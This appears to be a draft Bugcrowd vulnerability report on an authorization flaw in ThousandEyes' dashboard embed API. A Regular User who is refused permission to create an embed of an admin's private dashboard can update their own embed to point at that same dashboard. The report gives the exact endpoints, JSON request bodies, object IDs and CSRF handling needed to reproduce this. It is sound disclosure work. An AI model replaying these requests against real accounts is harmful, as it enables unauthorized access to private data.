# Regular User can retarget an embed onto a dashboard they cannot read or embed

**Program:** Cisco ThousandEyes Vulnerability Hunting (Bugcrowd, `thousandeyes-og`)
**Target:** `app.thousandeyes.com` (in scope)
**Class:** Broken object-level authorization / inconsistent create vs update checks (CWE-639, CWE-285)
**Suggested VRT:** Broken Access Control → IDOR → Modify/View Sensitive Information (Complex Object Identifiers GUID/UUID)
**Suggested severity:** P3 (same-org). Create on the unauthorized source is denied; update of an `*_OWN` embed accepts that same source.
**Do not submit until operator review.**

Tester: gmaxresonance. Required UA suffix `Bugcrowd-gmaxresonance` was used.
All objects are in the tester's own trial org (`Bug Crowd #1788764176934_2522`).
No adjacent-org IDs were probed.

## Summary

A built-in **Regular User** is granted `EMBED_OWN_UPDATE` only (no embed-all
permission). Published docs match that split:

- Embed own widgets: create embeds from **your own** dashboards
- Embed widgets for all users in account group: create embeds from **any
  dashboard visible to the account group** (admin)

  https://docs.thousandeyes.com/product-documentation/dashboards/embedding-dashboard-widgets-in-external-web-sites

`POST /namespace/dash-api/embed` **enforces** that. As Regular User
`resonance` (`gmaxresonance+reader@bugcrowdninja.com`, uid `562949953582941`):

- `GET /namespace/dash-api/dashboard/{adminDashId}` → **403**
  `User is not authorized to read this dashboard.`
- `POST /namespace/dash-api/embed` with `embedSource.id` = that admin
  private dashboard → **403** `User is not authorized to create embed`

`POST /namespace/dash-api/embed/{ownEmbedId}` (the real update verb from the
dash client) does **not**. The same Regular User created an embed of their
own dashboard, then updated `embedSource` to the admin private dashboard and
got **200**. A follow-up GET of the embed persisted the admin source id
`6a9efc5faffa359902bdd3ed` (`admin-dash-idor`). `ownerId` on the embed
became `null`.

This is the same class as the saved-event snapshot `*_OWN` miss: the update
path does not re-check the referenced object the create path rejects.

## Accounts

| Role | Email | uid |
|---|---|---|
| Organization Admin | gmaxresonance@bugcrowdninja.com | 562949953582783 |
| Regular User | gmaxresonance+reader@bugcrowdninja.com | 562949953582941 |

Account group aid `562949953672203` / orgId `562949953635231`.

Admin private dashboard (Regular User cannot GET or list it):

- id `6a9efc5faffa359902bdd3ed`
- title `admin-dash-idor`
- owner = Organization Admin

Regular User dashboard used to mint the embed:

- id `6a9efc038f4077e79e1a6e22`
- title `reader-dash-own`
- widget storeId used in the body: `6a9eab8aaffa359902bd2c94`

## Steps to reproduce

1. As Regular User, confirm the admin dashboard is unreadable:

   `GET /namespace/dash-api/dashboard/6a9efc5faffa359902bdd3ed` → 403

2. Create an embed of **your own** dashboard (CSRF from `meta[name=csrf-token]`
   or `_csrf` cookie → `X-CSRF-Token` / `X-XSRF-TOKEN`):

   `POST /namespace/dash-api/embed`

   ```json
   {
     "embedSource": {
       "id": "6a9efc038f4077e79e1a6e22",
       "title": "reader-dash-own",
       "type": "dashboard"
     },
     "widgetId": "6a9eab8aaffa359902bd2c94",
     "last": 86400,
     "flagIsIncludePiiUserData": false
   }
   ```

   → **200**, example `embedId` `02ac:b0deb490-33ab-4a49-a923-03e6a3335472`

3. Attempt to create an embed of the admin dashboard with the same shape
   (`embedSource.id` = `6a9efc5faffa359902bdd3ed`) → **403**
   `User is not authorized to create embed`

4. Update the embed from step 2 (do **not** percent-encode the colon in the
   path; `encodeURIComponent` on `{embedId}` 404s the POST):

   `POST /namespace/dash-api/embed/02ac:b0deb490-33ab-4a49-a923-03e6a3335472`

   ```json
   {
     "embedId": "02ac:b0deb490-33ab-4a49-a923-03e6a3335472",
     "embedSource": {
       "id": "6a9efc5faffa359902bdd3ed",
       "title": "admin-dash-idor",
       "type": "dashboard"
     },
     "widgetId": "6a9eab8aaffa359902bd2c94",
     "last": 86400,
     "flagIsIncludePiiUserData": false
   }
   ```

   → **200**, `embedSource.id` is now the admin dashboard, `ownerId` is null.

5. `GET /namespace/dash-api/embed/02ac%3Ab0deb490-33ab-4a49-a923-03e6a3335472`
   (colon encoded on GET) → **200**, same admin `embedSource` persisted.

## Observed vs not claimed

Confirmed:

- Create-on-admin-source denied, update-own-embed-to-admin-source allowed
- Persisted on GET
- Reproduced on more than one `embedId` in this session

Not claimed (do not oversell):

- `GET /namespace/dash-api/public/embed?embedId=...` returned **410**
  `Embed ... has been deleted` (API-created embeds had `template: null` and
  did not appear on Sharing → Embedded Widgets)
- `/e/{embedId}` loads the **Embedded Template** shell but stayed on a
  spinner; no admin widget payload was observed
- This is **not** “Regular User can embed their own dashboard” (`EMBED_OWN_UPDATE`
  is intended for that)

Impact if a valid admin `widgetId` is supplied, or if a UI-created embed
(with a real `template`) is retargeted, would be an unlisted public embed of
a private dashboard. That widget-id follow-up is still open.

## Artifacts to leave for triage

- Retargeted embed `02ac:b0deb490-33ab-4a49-a923-03e6a3335472`
- Admin dash `6a9efc5faffa359902bdd3ed` (`admin-dash-idor`)
- Reader dash `6a9efc038f4077e79e1a6e22` (`reader-dash-own`)

Do not keep creating more embeds of the same widget.
